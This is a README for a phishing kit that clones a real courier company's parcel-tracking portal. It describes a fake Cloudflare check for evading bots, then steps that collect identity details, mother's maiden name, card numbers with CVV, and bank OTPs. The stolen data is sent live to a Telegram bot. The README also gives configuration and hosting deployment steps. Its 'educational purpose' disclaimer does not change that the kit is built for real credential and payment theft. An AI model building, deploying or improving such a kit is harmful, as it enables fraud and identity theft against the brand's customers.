# The Courier Guy - Phishing Simulation Portal

## ⚠️ Disclaimer
**EDUCATIONAL PURPOSE ONLY.**
This project is a Proof of Concept (PoC) designed for security awareness training, phishing simulations, and red team engagements. It simulates a realistic courier phishing attack vector. Unauthorized usage against targets without prior mutual consent is illegal.

## 📌 Overview
This is a high-fidelity frontend clone of "The Courier Guy" tracking portal, engineered to simulate a credential harvesting campaign. It features a convincing multi-step flow that collects personal information, identity details, payment card data, and OTPs, sending everything in real-time to a configured Telegram bot.

## 🚀 Features

### 🛡️ Evasion & Security
- **Anti-Bot Entry Page**: Simulated "Cloudflare" security check screen to add legitimacy and filter traffic.
- **Realistic Loading States**: "Processing" animations to mimic real backend verifications.

### 🎣 Data Collection Flow
The application guides the victim through a logical sequence of "verification" steps:
1.  **Security Check**: Fake browser analysis.
2.  **Tracking Dashboard**: Displays "pending delivery" status to create urgency.
3.  **Receiver Info**: Collects Name, Address, City.
4.  **Identity Verification**: Collects ID Number, DOB, Phone, Email, and Mother's Maiden Name.
5.  **Customs Payment**: Collects Credit Card Number, Expiry, CVV.
6.  **3D Secure / OTP**: Simulated bank verification page (collects OTP or App Approval).
7.  **Success Page**: Final confirmation to reduce suspicion.

### 📡 Exfiltration
- **Telegram Integration**: All form submissions are sent immediately to a specified Telegram Chat via Bot API.
- **Detailed Logs**: Notifications include timestamps, specific data fields, and action types.

## 🛠️ Tech Stack
- **Frontend**: React (Vite)
- **Backend**: Node.js + Express
- **Styling**: Tailwind CSS + Shadcn UI
- **Routing**: Wouter
- **Animations**: Framer Motion
- **Icons**: Lucide React

## 🏗️ Architecture

```
server/secure/
├── config/          # Centralized configuration
├── panel/           # Security modules (IP management, bot detection, rate limiting)
├── app/             # Application modules (Telegram sending)
└── views/           # View components
```

Documentation: [md/](md/) — ARCHITECTURE.md, DEPLOYMENT.md, SECURITY_MODULES.md, etc.

## ⚙️ Configuration

Copy `.env.example` to `.env` and set your values:

```bash
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
SESSION_SECRET=your_secret  # Generate: openssl rand -base64 32
```

See [env.example](env.example) for all optional variables (copy to `.env`).

## 📦 Installation & Usage

### Développement local

```bash
npm install
npm run dev
```

### Build production

```bash
npm run build
npm start
```

### Déploiement sur GitHub

Pour créer le dépôt, pousser le code et configurer les secrets : **[md/DEPLOYMENT_GITHUB.md](md/DEPLOYMENT_GITHUB.md)**.

### Déploiement sur Render

1. Push le repo sur GitHub (voir le guide ci‑dessus).
2. Sur [Render](https://render.com) : **New → Web Service**, connecte le repo.
3. **Build Command**: `npm install && npm run build`
4. **Start Command**: `npm start`
5. **Environment**: ajoute les variables depuis [env.example](env.example) (au minimum `SESSION_SECRET`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`).
6. Optionnel : utilise un [Blueprint](https://render.com/docs/blueprint-spec) — le repo contient `render.yaml`.

Le service écoute sur le `PORT` fourni par Render (pas besoin de le définir).

### Déploiement sur VPS

Voir [md/DEPLOYMENT.md](md/DEPLOYMENT.md) pour Nginx/Apache, PM2, SSL et mise à jour.  
Voir [md/DEPLOYMENT_GITHUB.md](md/DEPLOYMENT_GITHUB.md) pour publier sur GitHub et déployer (ex. Render).

## 📄 License
This project is for educational and authorized testing purposes only.
